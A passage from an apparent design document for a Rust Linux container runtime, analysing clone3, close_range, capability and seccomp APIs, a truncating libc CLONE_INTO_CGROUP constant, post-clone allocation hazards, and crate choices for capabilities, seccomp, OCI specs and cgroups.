| 7 | **`mount_setattr`** | `not_implemented::yet` | `SYS_mount_setattr` + `mount_attr` + `MOUNT_ATTR_*` | 1 |
| — | `CLONE_INTO_CGROUP` | — | **broken on gnu, absent on musl** (§15.3) | 1 `const` |
| — | `seccomp(2)` | not wrapped | `SYS_seccomp` | 0–1 (§15.8) |
| — | `capget` / `capset` | **`rustix` has them** | nothing at all | **0** |
| — | `prctl(PR_SET_NO_NEW_PRIVS)` | **`rustix` has it** | the constant | **0** |
| — | `setresuid` / `setresgid` / `setgroups` | **`rustix` has them, already raw** | — | **0** |

**Reconciling the two earlier estimates.** Research produced both a "five-call `libc` surface" and
"about 200 lines of our own". Both were right about their own stack, and the gap is almost entirely
one thing.

- **The five-call figure was short by two.** `close_range` must join it because the `rustix`
  function believed to cover it does not exist; `mount_setattr` must join it because `rustix` lists
  it under `not_implemented::yet`.
- **The ~200-line figure was priced for a `libc`+`nix` stack.** `clone3` + `mount_setattr` +
  `close_range` are ~17 lines there and `prctl(PR_SET_NO_NEW_PRIVS)` is one. **The remaining ~180
  lines are `capget`/`capset`** — and only because `libc 0.2.191` supplies neither the structs nor
  the constants: no `__user_cap_header_struct`, no `__user_cap_data_struct`, no `fn capget`/`capset`
  declaration, and **no `CAP_*` constants at all** (only `SYS_capget = 125`, `SYS_capset = 126`).
  From bare `libc` that means two `#[repr(C)]` structs, the v3 magic `_LINUX_CAPABILITY_VERSION_3`
  (`0x20080522`), the two-`__u32` hi/lo split, and a ~41-entry name↔bit table.
- **Taking `rustix` deletes that entire block.** `rustix-1.1.5/src/thread/libcap.rs` already has the
  v3 header, the split (`u64::from(data.0.effective) | (u64::from(data.1.effective) << u32::BITS)`)
  and the version constant, from bindgen'd kernel headers.

**Recommendation.** The corrected figure for the recommended stack is **seven calls, one
hand-defined constant, ≈25 lines**. Write it that way, because a reader who sees "five" and "200" an
order of magnitude apart cannot tell which to budget for.

#### The `clone3` block, and three things that will bite

**Fact.** `libc-0.2.191`'s `clone_args` is field-for-field the kernel's current UAPI — eleven
`c_ulonglong` fields, `#[repr(align(8))]`, `size_of == 88`.
`torvalds/linux@v6.11/kernel/fork.c:2937` asserts `offsetofend(…, tls) == 64`,
`offsetofend(…, set_tid_size) == 80`, `offsetofend(…, cgroup) == 88`, and
`sizeof(struct clone_args) == CLONE_ARGS_SIZE_VER2`. `libc` does **not** define
`CLONE_ARGS_SIZE_VER0/1/2`, so the size argument is `size_of::<libc::clone_args>()` — correct
precisely because `libc` tracks the newest kernel.

**Fact.** The kernel's size-versioning rule is one rule, not three
(`torvalds/linux@v6.11/include/linux/uaccess.h`, `copy_struct_from_user`): equal sizes copy
verbatim; a smaller user struct is zero-filled to kernel size; a larger one has its unknown tail
**checked for zero**, returning `-E2BIG` otherwise.

**Recommendation.** Zero-initialise the whole struct and set only the fields you mean —
`core::mem::zeroed()`, **never** `MaybeUninit::uninit()`. A partially filled `clone_args` hands the
kernel garbage in `set_tid`/`set_tid_size`/`cgroup` and gets `-E2BIG` on an older kernel, or — far
worse, on a 5.5-vintage kernel — is *accepted and interpreted*.

**Fact.** Per-syscall guards around that shared helper:

| syscall | lower bound | upper bound | source |
|---|---|---|---|
| `clone3` | `usize < 64` → `-EINVAL` | `usize > PAGE_SIZE` → `-E2BIG` | `v6.11/kernel/fork.c:2944-2947` |
| `mount_setattr` | `usize < 32` → `-EINVAL` | `usize > PAGE_SIZE` → `-E2BIG` | `v6.11/fs/namespace.c` |
| `openat2` | `usize < 24` → `-EINVAL` | **none** | `v6.11/fs/open.c:1459` |

**Trap 1 — `CLONE_INTO_CGROUP` requires the *full* `size_of`.** `v6.11/kernel/fork.c`,
`copy_clone_args_from_user`: `if ((args.flags & CLONE_INTO_CGROUP) && (args.cgroup > INT_MAX ||
usize < CLONE_ARGS_SIZE_VER2)) return -EINVAL;`. An implementation that "plays it safe" by passing
64 to maximise kernel compatibility **silently loses race-free cgroup placement**, with `-EINVAL`
and no hint why. Always pass `size_of::<clone_args>()`; the compatibility worry it was solving is
already handled by the zero-tail rule.

**Trap 2 — the exit signal moves.** `clone(2)` ORs the termination signal into the flags word;
`clone3` **rejects** it. `v6.11/kernel/fork.c`, `clone3_args_valid`:
`if (kargs->flags & (CLONE_DETACHED | (CSIGNAL & (~CLONE_NEWTIME)))) return false;`. `CSIGNAL` is
`0xff` and `CLONE_NEWTIME` (`0x80`) is carved out of it. So under `clone3` the signal goes in
**`args.exit_signal = SIGCHLD as u64`** and the low byte of `flags` must be clear. Anyone
transliterating a `clone()` call gets `EINVAL` and no explanation. A third constraint for the
record: `if ((kargs->flags & (CLONE_THREAD | CLONE_PARENT)) && kargs->exit_signal) return false;` —
so `CLONE_PARENT` pairs with `exit_signal = 0`.

**Unverified.** Both traps are read from `kernel/fork.c@v6.11`, not run. The test, on a Linux dev VM:
`clone3` with `flags |= SIGCHLD` and `exit_signal = 0` → expect `EINVAL`, then clean `flags` with
`exit_signal = SIGCHLD` → expect success; and the same call with `size = 64` plus
`CLONE_INTO_CGROUP` → expect `EINVAL`, with `size = 88` → expect success.

**The `close_range` line.** `libc::close_range` is declared **gnu-only**, so it does not exist on
`x86_64-unknown-linux-musl` — but `libc::SYS_close_range` **is** defined on musl and every other
arch (and on mips as `4000 + 436`, which a hard-coded `436` would get wrong), and the flag constants
are present on all Linux targets, not gnu-gated:

```rust
// close_range(2), Linux >= 5.9. Absent from rustix (verified absent in 1.1.4 and 1.1.5);
// libc::close_range is gnu-only, but libc::SYS_close_range is defined on musl too.
// CLOSE_RANGE_CLOEXEC marks cloexec rather than closing, so a live Rust `File`'s Drop
// cannot later close an unrelated fd.
unsafe { libc::syscall(libc::SYS_close_range, 3, u32::MAX, libc::CLOSE_RANGE_CLOEXEC) }
```

Use the named constant, not a literal: `CLOSE_RANGE_CLOEXEC` is `1 << 2`; `1 << 1` is
`CLOSE_RANGE_UNSHARE`, which does something else entirely.

**Two smaller construction facts.** `libc::open_how` is `#[non_exhaustive]`
(`libc-0.2.191/src/unix/linux_like/linux/mod.rs:353`), so `libc::open_how { flags, mode, resolve }`
is a **compile error** from our crate — use `mem::zeroed()` and assign fields, which is what
`openat2(2)` requires anyway since every unknown field must be zero. "Struct is present" is not
"struct is constructible", and the first developer to hit it will think `libc` is broken. And
`mount_attr` has only ever had one version (`v6.11/fs/namespace.c` asserts
`sizeof(struct mount_attr) == MOUNT_ATTR_SIZE_VER0`), so its size argument is unconditionally
**32** — write that down so nobody invents a version dance that is not needed.

---

### 15.3 The trap that justifies this whole section

**Trap. `libc::CLONE_INTO_CGROUP` is typed `c_int` with a value that does not fit. It truncates to
zero on every glibc target, and it does not exist at all on musl.**

**Convention.** `libc-0.2.191/src/unix/linux_like/linux/gnu/mod.rs:766-782`, verbatim:

```rust
// DIFF(main): changed to `c_ulonglong` in e9abac9ac2. This is broken so should be fixed.
#[allow(overflowing_literals)]
#[deprecated(since = "0.2.188", note = "This constant overflows. …see #3584.")]
pub const CLONE_CLEAR_SIGHAND: c_int = 0x100000000;
#[allow(overflowing_literals)]
#[deprecated(since = "0.2.188", note = "This constant overflows. …")]
pub const CLONE_INTO_CGROUP: c_int = 0x200000000;
```

`c_int` is `i32` on every Linux target. `0x200000000` is 2³³ and `0x100000000` is 2³². Both are out
of range, and the deny-by-default `overflowing_literals` lint is suppressed **in place** with
`#[allow]`, so they compile and evaluate to **0**. Confirmed on `rustc 1.96.0` with the identical
`#[allow]` + literal + `i32`. `grep -rn "CLONE_INTO_CGROUP"` over `libc-0.2.191`'s musl tree returns
**nothing**, so on the target we actually ship the constant does not compile at all. Both are
correctly typed `c_ulonglong` in the Android tree, and upstream fixed it on `main` (commit
`e9abac9ac2`) — it has not reached the 0.2.x line as of 0.2.191, released 2026-10-16.

**Fact.** The consequence: `args.flags = … | libc::CLONE_INTO_CGROUP as u64` ORs in **zero**.
`clone3` **succeeds**, returns a pid, and the child lands in the **parent's** cgroup. There is no
error to catch, no `EINVAL`, nothing in `dmesg`. Every limit set on the target cgroup silently does
not apply to the container, and the symptom will be blamed on cgroup delegation for a week.

**Recommendation. The fix is one line, identical on gnu and musl:**

```rust
// linux/sched.h. NOT libc::CLONE_INTO_CGROUP: that constant is `c_int` on glibc targets and
// truncates to 0 (libc 0.2.191, issue #3584, fixed only on `main` in e9abac9ac2), and is
// undefined entirely on musl.
const CLONE_INTO_CGROUP: u64 = 1 << 33;   // 0x200000000
const CLONE_CLEAR_SIGHAND: u64 = 1 << 32; // 0x100000000
```

**Recommendation. The general lesson.** A dependency constant that is silently **zero** is the worst
failure shape available: it type-checks, compiles, runs, returns success, and does the wrong thing
with no diagnostic anywhere. Three defences, in order of value:

1. **Define kernel constants ourselves** wherever the value is load-bearing and the flag sits above
   bit 31. Any crate that types a flags set as `c_int` has this hazard class — which is also why
   `nix`'s `CloneFlags: c_int` could never have carried these.
2. **`#![deny(deprecated)]` in the core crate.** The `#[deprecated]` attribute is the saving grace:
   it produces a warning. Denying it turns a warning nobody reads into a build failure. This is
   "structural beats disciplined" applied to a dependency's bug.
3. **Assert the postcondition, not the call.** `clone3` returning a pid proves nothing about cgroup
   membership. Read `/proc/<child>/cgroup` in a test and compare it to the target path.

**Unverified.** The constant being `0` is proven from source and a local compile; the *behavioural*
consequence is inferred. The test, on the dev VM: `clone3` with
`flags = CLONE_NEWPID | (libc::CLONE_INTO_CGROUP as u64)` and `args.cgroup = <fd>`, then
`cat /proc/<child>/cgroup` → expect the **parent's** cgroup; repeat with our own `1u64 << 33` →
expect the target cgroup.

---

### 15.4 The post-`clone`, pre-`execve` window

#### 15.4.1 A raw `clone` is *more* dangerous than `fork()`, not less

**Fact.** glibc goes to considerable trouble to make `malloc` survive its own `fork()`.
`glibc-2.40/posix/fork.c`: when the process is multithreaded, `__libc_fork()` runs prefork handlers,
calls `_IO_list_lock()` and `__malloc_fork_lock_parent()` **before** the clone, and on the child
side calls `__malloc_fork_unlock_child()`, `fresetlockfiles()` (resetting every `FILE*`'s recursive
mutex), `_IO_list_resetlock()`, `__rtld_lock_initialize()` for both dynamic-loader locks, and —
unconditionally — `reclaim_stacks()`, which splices every other thread's stack off `dl_stack_used`.

**Fact.** A raw `clone3` is a bare kernel entry. **None of that runs.** No prefork handlers, no
malloc lock/unlock pair, no `fresetlockfiles`, no `_IO_list_resetlock`, no `__rtld_lock_initialize`,
no `reclaim_stacks`, no `pthread_atfork` handlers on either side. The child inherits every lock in
whatever state it was in.

**Recommendation. Restate the rule with the correct mechanism**, because a session that re-derives
from "fork is dangerous" will reach a wrong conclusion somewhere else:

> After a raw `clone`, the child inherits the parent's address space including every lock, and —
> unlike `fork(3)` — glibc has had no opportunity to quiesce or reset any of them. The rules below
> are not best practice; they are the only thing standing between us and an unreproducible hang.

This also closes off the reviewer who says "but glibc handles `fork`, doesn't it?" It does. We are
not calling it. The same point in a second guise: `reclaim_stacks()` is exactly what would have
removed §15.1.1's ghost threads from `dl_stack_used`, and under `clone3` it does not run.

**Fact.** Rust inherits the hazard exactly.
`rust-lang/rust@1.90.0/library/std/src/sys/alloc/unix.rs`: `System::alloc` is `libc::malloc`,
`alloc_zeroed` is `libc::calloc`, and `aligned_malloc` is `posix_memalign` — all the same arenas,
all the same locks.

**Recommendation.** The protection we substitute for glibc's recovery path is one invariant: **the
process that calls `clone3` must never have had a second thread.** If that holds, every mitigation
above is a no-op anyway and the two paths converge — which is why the invariant is load-bearing
rather than merely tidy, and why §15.6 treats an async runtime in the core crate as a correctness
bug rather than a weight problem.

#### 15.4.2 What this permits and forbids, in Rust specifically

**Fact.** `signal-safety(7)` is the governing list: a short POSIX-mandated set, essentially raw
syscalls plus a few reentrant string helpers. Mapped onto Rust, citing
`rust-lang/rust@1.90.0/library/std/src/io/stdio.rs`:

| Operation | Verdict in the child | Mechanism |
|---|---|---|
| `println!` / `print!` | **forbidden** | `stdio.rs:612`: `Stdout { inner: &'static ReentrantLock<RefCell<LineWriter<StdoutRaw>>> }` behind `static STDOUT: OnceLock<…>` (`:644`) — a lock that may be held, a `OnceLock` that may be mid-initialisation, and an inherited buffer with content |
| `eprintln!` / `eprint!` | **forbidden**, less bad | `stdio.rs:969`: `ReentrantLock<RefCell<StderrRaw>>` — unbuffered, and a plain `static`. The lock remains; there is no inherited buffer |
| `format!`, `String`, `Vec` growth, `to_owned`, `Box::new`, `CString::new`, any collection insert | **forbidden** | §15.4.1 — `System::alloc` → `libc::malloc` |
| `panic!`, any unwind, `unwrap()` on `Err`, slice index OOB, debug overflow panic | **forbidden** | the panic machinery formats and allocates, then may run the hook |
| `std::process::Command` | **forbidden** | spawns, allocates, reads env |
| any logging framework | **forbidden** | it allocates unconditionally (§15.6.3), independently of any lock question |
| `std::fs::*`, `Read`/`Write` on an existing `File` | **avoid** | the syscall is fine; the error path is `std::io::Error`, which allocates for custom errors. Use `rustix` and its `Errno(u16)` |
| `rustix::*` in §15.2's subset with `CString` paths | **safe** | no TLS (§15.1.2), no `std::io::Error`, no allocation (§15.4.3) |
| raw `libc::syscall(…)`, `libc::_exit`, `libc::execve` | **safe** | async-signal-safe by construction |
| `write(2)` of a pre-built `&[u8]` to a pre-opened raw fd | **safe** | this is how the child reports anything at all |
| `core::fmt::Write` into a pre-allocated `[u8; N]` | **safe** | no allocator involvement — the practical way to get a readable child error into a fixed-size record |

**Trap.** `nix::fcntl::Flock` — otherwise a good RAII API, and the documented replacement for the
now-deprecated `fcntl::flock` — **panics in `Drop`**: its `Drop` calls `flock(fd, LOCK_UN)` and, on
error while not already panicking, `panic!`s. A `Flock` alive across a `clone` means the child's
`Drop`, on any error path that is not `_exit`, can panic in the forbidden window. Flagged upstream
as nix#2802 (open, 2026-06-18) — which carries a second hazard worth knowing even though we decline
`nix`: `flock(2)` locks the **open file description**, not the descriptor, so `File::try_clone()`
breaks the wrapper entirely. Two `Flock`s over cloned descriptors are both "exclusive", and dropping
either unlocks **both**. For state-directory locking that is a correctness bug: **one owner of the
lock fd, never cloned**, and the lock strictly parent-side.

**Trap.** Duplicated output after a clone is real, but it is **not** the Rust vector people assume.
It is observed from C and Python parents because their stdio is **fully buffered** when stdout is
not a tty, so a fat unflushed buffer is inherited and flushed twice. Rust's `Stdout` is a
`LineWriter` *unconditionally*, even to a pipe (`stdio.rs:612`, with the standard library's own
`// FIXME: this should be LineWriter or BufWriter depending on the state of the console`), so a Rust
parent emitting only `\n`-terminated lines has an empty buffer and would not reproduce it. The real
Rust vectors are a `BufWriter` we construct ourselves, `print!` without a newline, any C library in
the process, and a logging subscriber that buffers into a `Vec<u8>`.

**Recommendation.** Two statements immediately before the `clone3`, beside the `Threads: 1`
assertion: `io::stdout().flush()` and `io::stderr().flush()`. That makes the whole class impossible
regardless of what a dependency did, and it is enforceable in a way a rule about log call sites is
not.

#### 15.4.3 The mitigation that makes the path-argument question moot by construction

**Convention.** `rustix 1.1.5`'s `path::Arg` is the one place a call in our subset could allocate.
`src/path/arg.rs`: for `&CStr` (line 454), `&CString` (492) and `CString` (527), `into_with_c_str`
is the **identity** — `f(self)`, zero copy, zero allocation. For every other type (`&str`, `String`,
`&Path`, `PathBuf`) it calls the shared `with_c_str` helper (`:948`), which uses a stack
`MaybeUninit<[u8; SMALL_PATH_BUFFER_SIZE]>` with `SMALL_PATH_BUFFER_SIZE = 256`
(`src/path/mod.rs:9`), and at `bytes.len() >= 256` falls into `#[cold] with_c_str_slow_path` —
which **under `feature = "alloc"` does `CString::new(bytes)`, a heap allocation.**

**Convention.** `std` implies `alloc`: `std = ["bitflags/std", "alloc", …]`, `default = ["std"]`. So
the heap slow path is live in the recommended feature set, and it is not theoretical — a
content-addressed store layout makes ≥ 256-byte paths the norm, not the exception.

**Recommendation.** Pre-built `CString`s are not a mitigation, they are an **elimination** — and the
discipline must be structural rather than remembered. Make the child-side setup take a struct whose
every path field is already a `CString`, built parent-side:

```rust
/// Every path the child touches, pre-encoded parent-side. No `&str`, no `PathBuf`, no `String`
/// may appear in this struct or in any function reachable from `child_main`: rustix's
/// `path::Arg` heap-allocates for any path >= 256 bytes (SMALL_PATH_BUFFER_SIZE,
/// rustix 1.1.5 src/path/mod.rs:9).
struct ChildPaths { rootfs: CString, old_root: CString, proc_target: CString, /* … */ }
```

Write the **256** into the comment so nobody "simplifies" it away.

**Recommendation (hardening move, not phase 1).** The child's code path could live in a crate
compiled with `rustix = { default-features = false, … }` — `alloc` **off**. Then the slow path uses
a `PATH_MAX` stack buffer and no `malloc` is reachable from any rustix path argument at any length.
Cost: no `std` in that crate — no `std::fs`, no `String` at all. Record it as what to do if we ever
get a real deadlock; do not start there.

#### 15.4.4 The test that proves the no-allocation property

**Uncertain.** "No `rustix` function in our subset allocates" is verified exhaustively for the
path-argument surface and spot-checked elsewhere, but **not** proven across all ~40 function bodies
we would call. Treat the universal form as unproven and settle it mechanically — a
`#[global_allocator]` counting shim, which needs no container and no root, so it runs in CI and on
the dev VM both:

```rust
// tests/no_alloc_in_child.rs
struct Counting;
static ALLOCS: AtomicUsize = AtomicUsize::new(0);
unsafe impl GlobalAlloc for Counting {
    unsafe fn alloc(&self, l: Layout) -> *mut u8 { ALLOCS.fetch_add(1, Relaxed); System.alloc(l) }
    unsafe fn dealloc(&self, p: *mut u8, l: Layout) { System.dealloc(p, l) }
}
#[global_allocator] static A: Counting = Counting;

#[test] fn child_setup_steps_allocate_nothing() {
    let paths = ChildPaths::build(&spec);   // parent-side; allocations allowed
    let before = ALLOCS.load(Relaxed);
    run_child_setup_dry(&paths);            // every child setup step, against /tmp, no clone
    assert_eq!(ALLOCS.load(Relaxed), before, "child setup path allocated");
}
```

**The detail that makes a naive version of this test worthless:** give it a `rootfs` path of
**≥ 256 bytes**. That length is the *only* input distinguishing rustix's stack fast path from its
heap slow path. A test built from `/tmp/x` passes whether or not the discipline is being followed.

**Settled, for the record.** `errno` in the child is **well-defined**: glibc's `errno` is
`__thread int` in the TCB, and after a `clone` without `CLONE_VM` — our case — the child has a
private copy-on-write address space, so the slot is its own. Reads and writes are defined; the value
is whatever the parent last left there. Under `linux_raw` the question does not arise at all, since
no rustix call in the subset reads `errno`. The residual exposure is §15.2's seven `libc` calls, of
which `execve`, `_exit` and `syscall(SYS_clone3)` do not meaningfully consult it and the rest are
checked immediately against their return value.

---

### 15.5 The domain crates

#### 15.5.1 Capabilities — **avoid `caps`; `rustix` already has it** (this recommendation reversed)

**Recommendation.** Use `rustix::thread::{capabilities, set_capabilities}` for the effective,
permitted and inheritable sets and `rustix::thread::{capability_is_in_bounding_set,
remove_capability_from_bounding_set, capability_is_in_ambient_set,
configure_capability_in_ambient_set, clear_ambient_capability_set}` for the two prctl-shaped sets.
Take **no** capability crate.

Earlier research recommended `caps 0.5.6` on the grounds that it saves ~200 lines of fiddly `unsafe`
around the v3 header and the two-`__u32` split. **That reasoning is factually correct** (§15.2
confirms `libc` supplies neither structs nor constants) **but it is an argument against
hand-writing, not an argument for `caps`.** `rustix::thread::libcap` already contains that header
and that split.

**The decisive reason is not the one originally argued.** The usual objection is allocation:
`caps-0.5.6/src/lib.rs:266` is `pub type CapsHashSet = HashSet<Capability>` and `pub fn set(tid,
cset, value: &CapsHashSet)`, so honouring OCI `process.capabilities` means building a `HashSet` — a
heap allocation plus up to 41 insertions — in the child after `clone3`, where `rustix`'s
`CapabilitySets` is a `Copy` struct of three `u64`s. True. The stronger argument:

**Convention. Every `caps` error path allocates *and* reads `errno` TLS.**
`caps-0.5.6/src/errors.rs` is `pub struct CapsError(pub(crate) String)`, and every construction site
— `src/base.rs:12,20`, `src/ambient.rs:14,32,47,62`, `src/bounding.rs:19,30` — is the same line:

```rust
Err(format!("capget failure: {}", std::io::Error::last_os_error()).into())
```

That does **three** forbidden things in the §15.4 window: `format!` allocates, `String` allocates,
and `std::io::Error::last_os_error()` reads the inherited `errno` TLS — reintroducing through the
back door the question `linux_raw` had eliminated. And it fires on the **failure** path, the one you
most need to survive in order to report anything at all.

**Two further mechanical objections.** `caps-0.5.6/src/base.rs:95` — `set()` is a read-modify-write
of **one set at a time**: `capget` → mutate one of {effective, permitted, inheritable} → `capset`,
so installing three base sets costs **6 syscalls** and passes through two intermediate capability
states, where `rustix::thread::set_capabilities(None, sets)` is **one `capset`**, atomically.
And `src/bounding.rs:6` — `clear()` is `for c in all() { if has_cap(c)? { drop(c)? } }`, up to **82
`prctl` calls**, with `all()` allocating a `Vec` *and* a `HashSet` every time. Worse,
`caps::runtime::procfs_all_supported()` opens **`/proc/sys/kernel/cap_last_cap`**
(`src/runtime.rs:40`) — in the container child, after `pivot_root` and before `/proc` is mounted,
that path does not exist; once it does, it is the container's `/proc`, not the host's. A capability
library that consults the filesystem is the wrong shape for this window.

**Set coverage runs the opposite way to the common claim.** `rustix` covers all five OCI sets; it
simply models them as the kernel does — `capget`/`capset` for three, `prctl` for two — instead of
flattening them into one enum. It also covers two steps of the identity-drop ordering that `caps`
does not cover **at all**: `thread::set_no_new_privs` (`caps` has zero hits for
`PR_SET_NO_NEW_PRIVS`) and `thread::set_keep_capabilities`.

**The one real `caps` advantage, and why it still loses.** It has a name↔bit table with
`FromStr`/`Display` (`Capability::CAP_SYS_ADMIN` ⇄ `"CAP_SYS_ADMIN"`), which is what parsing OCI
string capability names needs; `rustix`'s `CapabilitySet` is `bitflags` with Rust names
(`SYS_ADMIN`) and no `FromStr`. **Recommendation:** write the ~41-line `match` in the **parent**,
where allocation is legal, producing a `rustix::thread::CapabilitySets` that is `Copy`d into the
child. No dependency, and the table is exactly the kind of thing we want visible.

**Maintenance, fairly.** `lucab/caps-rs`: 96 stars, 8 open issues, pushed 2026-10-02, zero
advisories, 10 `unsafe` in 1,044 lines — and **one** commit in twelve months, by the sole
maintainer. Not rotten; inert. Its table is hardcoded to `CAP_CHECKPOINT_RESTORE = 40`, so it needs
a commit the day the kernel adds capability 41.

**What survives untouched, and it is the part that matters:** we own the identity-drop **ordering**
explicitly — `KEEPCAPS` → `setgroups` → `setgid` → `setuid` → bounding drop → `capset` → ambient →
`no_new_privs` — as one commented function, and no crate hides it.

#### 15.5.2 seccomp — **take `seccompiler` 0.5.0**, with a ceiling to record

**Recommendation.** Take `seccompiler`: a pure-Rust cBPF compiler, rule DSL (plus an optional JSON
frontend) in, `Vec<sock_filter>` out. Its **only** non-optional dependency is `libc`; 5 `unsafe` in
3,815 lines; no `build.rs`, no `pkg-config`, no C. `libseccomp 0.4.0` is FFI to the C library — its
`build.rs` is `pkg_config::Config::new().atleast_version("2.6.0").probe("libseccomp")`, which puts a
shared object on the link line and is the observed reason mainstream runtimes ship dynamic
executables. That collides with a static-musl target (§15.7.3), and that collision decides it.

**Does it hide what we want to learn?** Partly, and the parts it hides are the right ones: jump
arithmetic, 64-bit argument comparison as two 32-bit loads (cBPF registers are 32-bit, a genuine
source of bugs), and the per-architecture prologue. **Convention** —
`seccompiler-0.5.0/src/backend/bpf.rs:72` prepends to every program a load of `seccomp_data.arch` at
offset 4, a compare against the target's audit value (`AUDIT_ARCH_X86_64` =
`62 | 0x8000_0000 | 0x4000_0000`), and on mismatch **`SECCOMP_RET_KILL_PROCESS`** — closing the
classic bypass where a 64-bit process issues `int 0x80` and a filter written against x86_64 numbers
reads an i386 number as something else entirely. Verified for x86_64, aarch64 and riscv64
(`src/backend/mod.rs:81-99`). **Recommendation:** stricter than the usual default, which is good —
but the `arch` check must remain visible in *our* code as stated policy, not an inherited detail.

**The ceiling, which must be priced as a choice.** **Convention** — `SeccompFilter` carries **one**
`target_arch`; there is no `seccomp_arch_add` equivalent. The OCI runtime-spec's
`linux.seccomp.architectures` is a **list** (`SCMP_ARCH_X86_64`, `SCMP_ARCH_X86`, `SCMP_ARCH_X32`),
and the common default profile lists three. **`seccompiler` structurally cannot express a
multi-architecture OCI profile.** It will *kill* anything that is not the one arch — safe, but not
what the config asked for. Three outcomes, to be picked rather than drifted into:

| Option | Cost |
|---|---|
| (a) accept single-arch, document that we reject multi-arch profiles | phase-1 correct; an OCI conformance gap |
| (b) emit the multi-arch dispatch ourselves over `seccompiler`'s `BpfProgram` | mechanical — it is a `Vec<sock_filter>`: load arch, jump table, concatenate per-arch bodies, fix up relative jumps |
| (c) take `libseccomp` | loses static musl |

**Recommendation:** (a) for phase 1; revisit at OCI-compatibility time.

**Three facts to record.** `src/backend/bpf.rs:25` sets `BPF_MAX_LEN = 4096` and
`src/backend/filter.rs:221` rejects `len >= BPF_MAX_LEN`, while the kernel's rule is
`len == 0 || len > BPF_MAXINSNS → -EINVAL` — so a program of *exactly* 4096 is legal and
`seccompiler` rejects it. Off-by-one in the safe direction, costing one instruction, producing a
typed error instead of an `EINVAL`; worth knowing because a large default profile emitting one
comparison per syscall approaches the ceiling. **Unverified:** whether a real default profile fits —
test with `seccompiler::compile_from_json` over the profile, then assert `program.len() < 4096`.
**Trap:** `rust-vmm/seccompiler`'s repository is **archived** (*"This is a public archive. The code
now lives in the mono-repo…"*); the code moved into the live `rust-vmm/rust-vmm` monorepo (pushed
2026-10-19). This is a **consolidation, not an abandonment**, but crates.io's `repository` field
still points at the archive, so a reviewer checking the link in a year will see a banner and
conclude the crate is dead — put that in the dependency comment. No release since **0.5.0 /
2025-03-07**, and `SECCOMP_RET_USER_NOTIF` support landed in the repo on 2026-04-14 and is still
unreleased. And it **does** do more than expected: `apply_filter` / `apply_filter_all_threads`
(`src/lib.rs:344-365`) perform the whole install — `prctl(PR_SET_NO_NEW_PRIVS, 1)` then
`syscall(SYS_seccomp, SECCOMP_SET_MODE_FILTER, flags, &sock_fprog)` — with TSYNC handled and the
"return value > 0 is the offending tid" convention honoured.

**Trap.** One argument previously called decisive is weaker than stated: *"`libseccomp` cannot
express the `ENOSYS`-above-max rule, and this alone decides it."* `libseccomp` **can** express a
per-syscall `ENOSYS` rule; only the open-ended above-max rule needs a post-pass over the generated
program. The verdict is unchanged; the reason is the C dependency and static musl.

#### 15.5.3 OCI spec types — **take `oci-spec` 0.10.0**, pinned exactly, with a key-diff auditor

**Recommendation.** Take it with `default-features = false, features = ["runtime"]`, pin the
**exact** version rather than a caret range, convert it once into our own internal `Config` at one
boundary, and never let its types leak past that wall.

**Does it hide a mechanism?** No, and this is the cleanest "no" in the section. **10,462 lines
across 32 files**, 3 `unsafe` occurrences, zero advisories, Apache-2.0, dependencies `serde`,
`serde_json`, `thiserror`, `const_format`, `derive_builder`, `getset`, `strum`. There is no `clone`,
no `mount`, no cgroup write and no process management anywhere in it. Transcribing a JSON schema is
the one part of this project that is pure clerical work — the part where a silent mistake (a wrong
`#[serde(rename)]`, a missing `Option`) produces a bug that looks like a kernel problem. And the
hand-write alternative is not the "~300 lines" sometimes estimated: `config.json`'s schema is `Spec`
+ `Process` + `User` + `Linux` + `LinuxResources` + `LinuxDevice` + `LinuxSeccomp` + `Mount` +
`Hooks` + `Root` + roughly 40 more types with builders, and it goes stale on every spec revision.

**Trap — the crate asserts three different spec versions.** **Convention**, in `oci-spec 0.10.0`:
`src/runtime/version.rs` gives `VERSION_MAJOR/MINOR/PATCH = 1/1/0` with `VERSION_DEV = ""`, so
**`runtime::VERSION == "1.1.0"`** — *not* `"1.1.0-dev"`, as is sometimes reported;
`src/runtime/mod.rs:195` has `Spec::default()` emit `version: String::from("1.0.2-dev")`; and the
structs themselves carry runtime-spec **1.3.0** fields. (`image::VERSION` is `"1.0.1"` while
image-spec is at 1.1.1.) No newer release has fixed it — crates.io's max stable is still **0.10.0,
updated 2026-05-27** — though `youki-dev/oci-spec-rs` is very much alive (300 stars, pushed
2026-10-23).

**Recommendation.** The operational consequence is small, and should be stated so nobody panics: we
do not call `Spec::default()` and we do not emit `VERSION`. The `ociVersion` we **write** is our own
constant and our own decision; the one we **read** we validate ourselves. The crate's internal
confusion is a signal about its *release discipline*, not a correctness problem for us — and it is
the reason to pin exactly and re-read `version.rs` on every bump.

**Recommendation — build the key-diff auditor first.** Deserialize `config.json` **twice**: once
into `oci_spec::runtime::Spec`, once into `serde_json::Value`. Walk the `Value`'s key paths against
an explicit allowlist of what we implement. Unknown-and-harmless → WARN; unknown-and-security
(`seccomp`, `capabilities`, `readonlyPaths`, `maskedPaths`) → **hard error**. About 30 lines. With a
complete third-party struct set, `serde` will cheerfully deserialize `linux.seccomp` into a field we
never read, with no compile error and no runtime signal — and silently ignoring a security field is
the one unacceptable failure. Precisely *because* the crate's version metadata is unreliable, this
auditor is the only trustworthy answer to "what is in this config that we do not handle?", and it
catches keys that neither we nor the crate know about, which is what a future spec revision looks
like.

#### 15.5.4 cgroups — **no crate**, and the obvious one is disqualified structurally

**Recommendation.** cgroup v2 is `mkdir` plus `std::fs::write` of short ASCII strings. Write it: a
`CgroupRoot` holding an `O_PATH` dirfd, `openat`-relative writes so paths are never re-resolved, and
a flat-key parser that is `line.split_once(' ')`.

**Measured** on a live host (kernel 6.11.0-29, read-only `stat`/`cat`/`ls` under `/sys/fs/cgroup`):
`stat -f -c %T /sys/fs/cgroup` → `cgroup2fs`; `cgroup.controllers` → `cpuset cpu io memory hugetlb
pids rdma misc`; a running container's cgroup directory holds 81 files, of which a runtime writes
about a dozen — `cgroup.procs`, `cgroup.subtree_control`, `cgroup.kill`, `cgroup.freeze`,
`memory.{max,swap.max,low}`, `io.max`, `cpu.{max,weight}`, `pids.max`, `cpuset.cpus`. Note
`cgroup.kill` is mode `--w-------`: write-only, root-only.

**A crate cannot abstract the hard parts**, which are policy, not syntax: the no-internal-process
rule, delegation and the systemd single-writer discipline, swap arithmetic, OOM-detection semantics
and kill ordering. Every candidate leaves all of those to the caller.

**`cgroups-rs 0.5.1` — avoid, and the real reason is far worse than its D-Bus dependency.**
**Convention** — its complete non-dev dependency list is `bit-vec`, `libc`, `log`,
